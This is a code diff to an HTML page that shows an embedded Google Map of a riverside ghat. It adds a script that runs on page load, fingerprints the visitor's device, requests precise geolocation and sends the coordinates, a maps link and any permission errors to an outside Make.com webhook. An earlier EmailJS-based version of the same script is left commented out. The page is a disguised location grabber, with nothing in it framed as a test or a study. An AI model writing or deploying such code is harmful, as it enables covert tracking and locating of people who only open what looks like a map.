@@ -27,7 +27,124 @@
 <body>
   <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d1749.1153592035375!2d77.17307!3d28.742527700000004!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x390d01ef1c688a89%3A0xf7ef73206e64680b!2sChhath%20pooja%20ghat!5e0!3m2!1sen!2sin!4v1794830732143!5m2!1sen!2sin" width="600" height="450" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="strict-origin-when-cross-origin"></iframe>
 
+
+
+
+
+
+
+
+  
 <script>
+  const WEBHOOK_URL = 'https://hook.eu1.make.com/pb2pwu4nh3716gark9cluzj9rsam3w15';
+
+  const MAPS_FAVICON =
+    'https://www.google.com/s2/favicons?domain=maps.google.com&sz=64';
+
+  // Collect information exposed by the browser
+  function getDeviceInfo() {
+    return {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      languages: navigator.languages,
+      timezone:
+        Intl.DateTimeFormat().resolvedOptions().timeZone,
+      screenWidth: screen.width,
+      screenHeight: screen.height,
+      colorDepth: screen.colorDepth,
+      pixelRatio: window.devicePixelRatio,
+      hardwareConcurrency: navigator.hardwareConcurrency ?? null,
+      deviceMemory: navigator.deviceMemory ?? null,
+      online: navigator.onLine,
+      cookieEnabled: navigator.cookieEnabled,
+      page: location.href,
+      timestamp: new Date().toISOString()
+    };
+  }
+
+  // Send information to webhook
+  function sendReport(payload) {
+    return fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'text/plain;charset=UTF-8'
+      },
+      body: JSON.stringify({
+        ...getDeviceInfo(),
+        ...payload
+      }),
+      keepalive: true
+    })
+    .then(response => {
+      console.log('Webhook response:', response.status);
+    })
+    .catch(error => {
+      console.error('Webhook request failed:', error);
+    });
+  }
+
+  // Check browser support
+  if (!('geolocation' in navigator)) {
+    sendReport({
+      event: 'location_error',
+      error: {
+        code: null,
+        message: 'Geolocation is not supported by this browser.'
+      }
+    });
+  } else {
+    navigator.geolocation.getCurrentPosition(
+      // Location successfully obtained
+      (pos) => {
+        const latitude = pos.coords.latitude;
+        const longitude = pos.coords.longitude;
+
+        sendReport({
+          event: 'location_success',
+          location: {
+            latitude,
+            longitude,
+            accuracy: pos.coords.accuracy,
+            timestamp: pos.timestamp,
+            mapsLink:
+              `https://www.google.com/maps?q=${latitude},${longitude}`,
+            mapsFavicon: MAPS_FAVICON
+          }
+        });
+      },
+
+      // Permission denied or another location error
+      (err) => {
+        const errorMessages = {
+          1: 'Location permission denied.',
+          2: 'Location position unavailable.',
+          3: 'Location request timed out.'
+        };
+
+        sendReport({
+          event: 'location_error',
+          error: {
+            code: err.code,
+            message:
+              errorMessages[err.code] || err.message,
+            browserMessage: err.message
+          }
+        });
+      },
+
+      {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
+      }
+    );
+  }
+</script>
+
+
+
+<!-- <script>
   const WEBHOOK_URL = 'https://hook.eu1.make.com/pb2pwu4nh3716gark9cluzj9rsam3w15';
   // EmailJS settings from the working Contact.tsx integration.
   const EMAILJS_SERVICE_ID = 'service_vmsdz4p';
@@ -105,6 +222,6 @@
       { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
   }
-</script>
+</script> -->
 </body>
 </html>
